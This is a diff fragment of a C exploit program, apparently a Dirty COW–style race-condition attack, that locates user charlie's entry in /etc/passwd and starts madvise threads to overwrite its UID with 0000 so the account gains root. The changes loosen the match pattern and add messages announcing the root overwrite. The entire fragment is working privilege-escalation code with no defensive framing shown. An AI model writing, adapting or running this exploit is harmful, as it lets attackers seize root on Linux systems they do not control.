@@ -51,14 +51,16 @@ int main(int argc, char *argv[])
         return 1;
     }
 
-    // Find position of target user record
-    char *position = strstr(map, "charlie:x:1001");
+    // Find position of target user record (dynamically matches charlie's line)
+    char *position = strstr(map, "charlie:x:");
     if (!position) {
-        fprintf(stderr, "Pattern charlie:x:1001 not found in /etc/passwd\n");
+        fprintf(stderr, "Pattern charlie:x: not found in /etc/passwd\n");
         return 1;
     }
 
     printf("Pattern found at offset: %ld\n", (long)(position - (char *)map));
+    printf("Target line currently: %.20s\n", position);
+    printf("Overwriting with charlie:x:0000 to assign root UID...\n");
     printf("Starting race condition threads against /etc/passwd... Press Ctrl+C after 2-4 seconds.\n");
 
     pthread_create(&pth1, NULL, madviseThread, (void *)(size_t)file_size);
